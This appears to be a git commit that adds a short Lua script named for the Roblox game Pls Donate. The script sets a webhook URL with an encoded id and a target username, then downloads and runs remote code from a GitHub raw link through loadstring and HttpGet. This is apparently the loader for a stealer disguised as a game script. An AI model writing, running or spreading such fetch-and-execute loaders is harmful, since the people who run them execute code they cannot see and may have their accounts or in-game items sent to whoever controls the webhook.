c97952a14ca901a472f1129d8a69241eeba22fa8
Trace-Seeker163 <maind9704@gmail.com>
2025-04-04 09:14:51 +0200

    Create Pls-Donate.lua

---
+++ Pls-Donate.lua
@@ -0,0 +1,4 @@
+Webhook = "https://webhook-protec t.vercel.app/api/webhook?id=cE5jNVQwc1BWMnYxX3k2MDJTSXRGQTpMZnBSR1dNQnE4NE9rSml3enRyeWxEbThaa3lmWjVGN2hCdlRTQU1XNHBwXzdjRnpCSnAyWHM1R1BaZW1jOW05aDYzQXRSVERwY2xpazNfV1B0Q29uMGVxSGcxbU1sMm1fWWJ2MkN0NDRldXRPdFplVGVYdVlhV1QwZjdiZWp1QllmaUJVZWw3X01GWV9fMEs5cXdJSmN5M3ozMFZSZXF4b1d6VHpGV2JvWFU"
+Username = "ToxicVortex0"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/lelel22f/wow1/refs/heads/main/f222",true))()
